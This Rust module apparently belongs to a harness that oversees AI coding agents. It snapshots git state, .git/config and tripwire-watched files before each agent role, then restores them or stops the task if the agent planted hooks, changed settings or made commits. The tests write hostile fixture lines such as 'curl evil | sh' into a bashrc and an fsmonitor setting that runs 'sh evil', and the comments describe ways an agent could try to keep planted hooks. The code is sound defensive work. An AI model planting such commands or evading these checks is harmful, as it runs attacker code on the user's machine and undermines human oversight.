//! What the harness notes before an agent runs, and the first checks right
//! after it, before git runs again with whatever settings the agent left.

use std::path::PathBuf;

use super::{GitAfterRole, RunError, StopReason};
use crate::git::{GitError, LocalConfig, Repo};
use crate::task::agent_stubs::MissingStubs;
use crate::task::handoff::Role;
use crate::task::tripwire::{Changes, Snapshot, Watched};
use crate::text;

/// Git's message after a role is cut to this many characters: it is shown in
/// one line of the TUI, and it can repeat text the agent chose.
const GIT_ERROR_CHARS: usize = 300;

/// The state before one attempt of a role.
pub(super) struct Before {
    git_dir: PathBuf,
    head: Option<String>,
    branch: Option<String>,
    branch_heads: String,
    config_path: PathBuf,
    config: LocalConfig,
    hidden: Snapshot,
    stubs: MissingStubs,
}

impl Before {
    /// Notes the last commit, the branches, `.git/config`, the files the
    /// tripwire watches and which of Claude Code's stub files are missing.
    pub(super) fn take(repo: &Repo, watched: &Watched) -> Result<Self, RunError> {
        let config_path = repo.local_config_path()?;
        Ok(Self {
            git_dir: repo.git_common_dir()?,
            head: repo.head()?,
            branch: repo.current_branch()?,
            branch_heads: repo.branch_heads()?,
            config: LocalConfig::read(&config_path)?,
            config_path,
            hidden: watched.snapshot(),
            stubs: MissingStubs::note(repo.root()),
        })
    }

    /// Compares with now: git's settings, the tripwire, the commit and the
    /// branches. Puts back what can be put back and returns why the task
    /// must stop, or `None` when all is as before. When Claude Code's stub
    /// block was there, removes its new empty stub files (see
    /// [`crate::task::agent_stubs`]), except after a commit or branch change
    /// (then the next run removes them).
    pub(super) fn check(
        &self,
        repo: &Repo,
        watched: &Watched,
        role: Role,
    ) -> Result<Option<StopReason>, RunError> {
        // First of all, before git runs again with the agent's settings or
        // hooks. The tripwire goes first: it runs no git and cannot fail, so
        // an agent cannot keep a planted hook by breaking `.git/config`.
        let mut changes = self.hidden.check_and_restore(watched);
        // Settings that could not be put back are like a hook that could not
        // be: git would run what the agent put there. They join that list.
        let config_changed = self.restore_config().unwrap_or_else(|_| {
            changes.not_put_back.push(self.config_path.clone());
            false
        });
        // A file that could not be put back may be a planted hook that git
        // would run on the user's next command: this wins over everything,
        // and its message asks the user to check the commits and settings too.
        if !changes.not_put_back.is_empty() {
            let git = GitAfterRole::NotChecked;
            return Ok(Some(hidden_changes(role, changes, config_changed, git)));
        }
        let claude_stubs = changes.claude_stubs;
        let git_changed = self.git_changed(repo);
        // Whether the commits and branches are known to be as before.
        let commits_same = matches!(git_changed, Ok(false));
        let stop = if changes.is_empty() {
            // Nothing else to tell: a git error is a problem to show as it is.
            if git_changed? {
                Some(StopReason::AgentCommitted(role))
            } else if config_changed {
                Some(StopReason::GitConfigChanged(role))
            } else {
                None
            }
        } else {
            // The tripwire's list must reach the user whatever else
            // happened: it holds the files outside the project that only the
            // user can check. So its stop reason also says whether the
            // settings were put back and what git said: a new commit, or an
            // error (a broken `~/.gitconfig` makes git refuse to start).
            let git = match git_changed {
                Ok(false) => GitAfterRole::Same,
                Ok(true) => GitAfterRole::Changed,
                // Git's message can repeat a value from a settings file the
                // agent wrote, so it is cleaned and cut to one short line.
                Err(e) => GitAfterRole::Failed(text::safe_line(&e.to_string(), GIT_ERROR_CHARS)),
            };
            Some(hidden_changes(role, changes, config_changed, git))
        };
        // Claude Code's empty stub files would otherwise end up in the role's
        // commit, or stop the next run as uncommitted changes, once
        // `info/exclude` no longer hides them. Only when its block was there:
        // another agent's empty file is its own work. After a commit or a
        // branch change (or when git could not tell) they stay: whether the
        // new commit holds them only `git status` could tell, and a tracked
        // file is never removed. The next run removes them if they are still
        // empty and untracked (`agent_stubs::remove_leftover_stubs`).
        if claude_stubs && commits_same {
            match stop {
                // No git here: something was changed that should not have
                // been, and `git status` would run with whatever else the
                // agent planted. A file that cannot be removed is shown to
                // the user by the next run; the stop reason matters more.
                Some(_) => self.stubs.remove_empty_without_git(),
                // Only now, with nothing left that could make git run the
                // agent's command (`git status` reads `~/.gitconfig` and its
                // filters).
                None => self.stubs.remove_new_empty(repo)?,
            }
        }
        Ok(stop)
    }

    /// Did the role make a commit, switch the branch, or make, move or
    /// delete a branch? A new branch at the same commit would make the
    /// harness commit the role's work on that branch, so a switch counts
    /// like a commit. So does any branch change: the harness later checks
    /// out a task's branch and reads its settings, which no role may change.
    /// Branches cannot be put back, and the next run would take them as they
    /// are, so this reason wins over the others.
    fn git_changed(&self, repo: &Repo) -> Result<bool, GitError> {
        // With a broken `.git` git may find a repository further up instead
        // (a project inside another one), whose commits mean nothing here.
        let git_dir = repo.git_common_dir()?;
        if git_dir != self.git_dir {
            return Err(GitError::Failed {
                command: "rev-parse --git-common-dir".to_string(),
                stderr: format!("git now finds another repository: {}", git_dir.display()),
            });
        }
        Ok(repo.head()? != self.head
            || repo.current_branch()? != self.branch
            || repo.branch_heads()? != self.branch_heads)
    }

    /// Puts `.git/config` back when it changed; `true` when it did. No git
    /// runs here: with broken settings it would not start. A file that can
    /// no longer be read (`chmod 000`, too big) has changed too.
    fn restore_config(&self) -> Result<bool, RunError> {
        let changed = LocalConfig::read(&self.config_path).map_or(true, |now| now != self.config);
        if changed {
            self.config.put_back(&self.config_path)?;
        }
        Ok(changed)
    }
}

/// The stop reason for what the tripwire found; `config_put_back` when
/// `.git/config` had changed too and is now as before, `git` what git said.
fn hidden_changes(
    role: Role,
    changes: Changes,
    config_put_back: bool,
    git: GitAfterRole,
) -> StopReason {
    StopReason::HiddenChanges {
        role,
        put_back: changes.put_back,
        reported: changes.reported,
        not_put_back: changes.not_put_back,
        config_put_back,
        git,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn a_commit_does_not_hide_changed_files_outside_the_project() {
        let dir = tempfile::tempdir().unwrap();
        let repo = Repo::init(dir.path()).unwrap();
        fs::write(dir.path().join("a.txt"), "a").unwrap();
        repo.commit_all("first").unwrap();
        let bashrc = dir.path().join("home-bashrc");
        let watched = Watched {
            reported_files: vec![bashrc.clone()],
            ..Watched::default()
        };
        let before = Before::take(&repo, &watched).unwrap();
        // What an agent with a shell could do in one role.
        fs::write(&bashrc, "curl evil | sh\n").unwrap();
        fs::write(dir.path().join("a.txt"), "b").unwrap();
        repo.commit_all("sneaky").unwrap();

        let stop = before.check(&repo, &watched, Role::Developer).unwrap();

        let Some(StopReason::HiddenChanges { reported, git, .. }) = stop else {
            panic!("{stop:?}");
        };
        assert_eq!(reported, [bashrc]);
        assert_eq!(git, GitAfterRole::Changed);
    }

    #[test]
    fn a_broken_project_inside_another_repository_is_not_a_commit() {
        let outer = tempfile::tempdir().unwrap();
        let outer_repo = Repo::init(outer.path()).unwrap();
        fs::write(outer.path().join("a.txt"), "a").unwrap();
        outer_repo.commit_all("outer").unwrap();
        let inner = outer.path().join("inner");
        fs::create_dir(&inner).unwrap();
        let repo = Repo::init(&inner).unwrap();
        let watched = Watched::default();
        let before = Before::take(&repo, &watched).unwrap();
        // Git now skips the broken folder and finds the outer repository.
        fs::write(inner.join(".git/HEAD"), "not a ref\n").unwrap();

        let checked = before.check(&repo, &watched, Role::Developer);

        assert!(checked.is_err(), "{checked:?}");
    }

    // Making a link needs extra rights on Windows, so this runs on Linux and macOS.
    #[cfg(unix)]
    #[test]
    fn settings_that_cannot_be_put_back_join_the_list_and_nothing_is_lost() {
        let dir = tempfile::tempdir().unwrap();
        let repo = Repo::init(dir.path()).unwrap();
        // The user keeps the settings behind a link of their own.
        let config = repo.local_config_path().unwrap();
        let shared = dir.path().join("shared-config");
        fs::rename(&config, &shared).unwrap();
        std::os::unix::fs::symlink(&shared, &config).unwrap();
        let bashrc = dir.path().join("home-bashrc");
        let watched = Watched {
            reported_files: vec![bashrc.clone()],
            ..Watched::default()
        };
        let before = Before::take(&repo, &watched).unwrap();
        fs::write(&bashrc, "curl evil | sh\n").unwrap();
        // What `git config core.fsmonitor ...` does through the link; the
        // harness does not write back through it.
        fs::write(&shared, "[core]\n\tfsmonitor = sh evil\n").unwrap();

        let stop = before.check(&repo, &watched, Role::Developer).unwrap();

        let Some(StopReason::HiddenChanges {
            reported,
            not_put_back,
            git,
            ..
        }) = stop
        else {
            panic!("{stop:?}");
        };
        assert_eq!(reported, [bashrc]);
        assert_eq!(not_put_back, [config]);
        assert_eq!(git, GitAfterRole::NotChecked);
    }

    // Only Linux and macOS can make a file unreadable with its mode. As root
    // (in a container) every file can be read, so there this passes also
    // without the fix; as a user (CI) the unreadable file used to end the
    // check with an error before anything was put back.
    #[cfg(unix)]
    #[test]
    fn unreadable_settings_are_put_back() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().unwrap();
        let repo = Repo::init(dir.path()).unwrap();
        let watched = Watched::default();
        let before = Before::take(&repo, &watched).unwrap();
        let path = repo.local_config_path().unwrap();
        fs::set_permissions(&path, fs::Permissions::from_mode(0o000)).unwrap();

        let stop = before.check(&repo, &watched, Role::Developer).unwrap();

        assert_eq!(stop, Some(StopReason::GitConfigChanged(Role::Developer)));
        assert_eq!(repo.local_config().unwrap(), before.config);
    }
}
